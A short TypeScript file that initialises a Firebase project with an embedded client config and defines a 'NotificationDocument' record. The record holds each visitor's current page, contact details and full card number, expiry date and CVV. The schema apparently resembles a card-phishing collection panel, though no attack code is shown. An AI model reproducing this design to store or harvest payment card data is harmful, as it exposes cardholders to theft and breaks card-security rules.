import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyAVoT_Tp52LkKLG4oGvEdc5wrPyipCuAmo",
  authDomain: "zad-1451f.firebaseapp.com",
  projectId: "zad-1451f",
  storageBucket: "zad-1451f.firebasestorage.app",
  messagingSenderId: "4643810474",
  appId: "1:4643810474:web:343c87330da32c460534d3",
  measurementId: "G-NS91YSZYLM"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
